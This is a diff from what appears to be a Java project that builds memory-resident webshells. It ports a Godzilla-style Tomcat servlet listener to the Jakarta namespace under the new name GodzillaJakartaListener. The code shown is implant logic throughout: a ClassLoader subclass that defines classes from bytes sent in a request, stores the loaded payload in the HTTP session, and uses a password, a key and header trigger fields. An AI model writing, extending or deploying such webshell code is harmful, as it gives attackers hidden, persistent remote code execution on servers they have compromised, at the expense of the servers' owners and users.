@@ -2,28 +2,28 @@ package com.reajason.javaweb.memsell.tomcat.godzilla;
 
 import javax.crypto.Cipher;
 import javax.crypto.spec.SecretKeySpec;
-import javax.servlet.ServletRequestEvent;
-import javax.servlet.ServletRequestListener;
-import javax.servlet.http.HttpServletRequest;
-import javax.servlet.http.HttpServletResponse;
-import javax.servlet.http.HttpSession;
+import jakarta.servlet.ServletRequestEvent;
+import jakarta.servlet.ServletRequestListener;
+import jakarta.servlet.http.HttpServletRequest;
+import jakarta.servlet.http.HttpServletResponse;
+import jakarta.servlet.http.HttpSession;
 import java.io.ByteArrayOutputStream;
 import java.lang.reflect.Field;
 
 /**
  * @author ReaJason
  */
-public class GodzillaListener extends ClassLoader implements ServletRequestListener {
+public class GodzillaJakartaListener extends ClassLoader implements ServletRequestListener {
     public String md5;
     public String pass;
     public String key;
     public String headerName;
     public String headerValue;
 
-    public GodzillaListener() {
+    public GodzillaJakartaListener() {
     }
 
-    public GodzillaListener(ClassLoader z) {
+    public GodzillaJakartaListener(ClassLoader z) {
         super(z);
     }
 
@@ -85,7 +85,7 @@ public class GodzillaListener extends ClassLoader implements ServletRequestListe
         return value;
     }
 
-    @SuppressWarnings("deprecation")
+    @SuppressWarnings("all")
     public Class<?> Q(byte[] cb) {
         return super.defineClass(cb, 0, cb.length);
     }
@@ -98,10 +98,6 @@ public class GodzillaListener extends ClassLoader implements ServletRequestListe
         } catch (Exception var4) {
             return null;
         }
-    }
-
-    @Override
-    public void requestDestroyed(ServletRequestEvent servletRequestEvent) {
     }
 
     @Override
@@ -118,7 +114,7 @@ public class GodzillaListener extends ClassLoader implements ServletRequestListe
                 if (session.getAttribute("payload") == null) {
                     session.setAttribute(
                             "payload",
-                            (new GodzillaListener(this.getClass().getClassLoader())).Q(data));
+                            (new GodzillaJakartaListener(this.getClass().getClassLoader())).Q(data));
                 } else {
                     request.setAttribute("parameters", data);
                     ByteArrayOutputStream arrOut = new ByteArrayOutputStream();
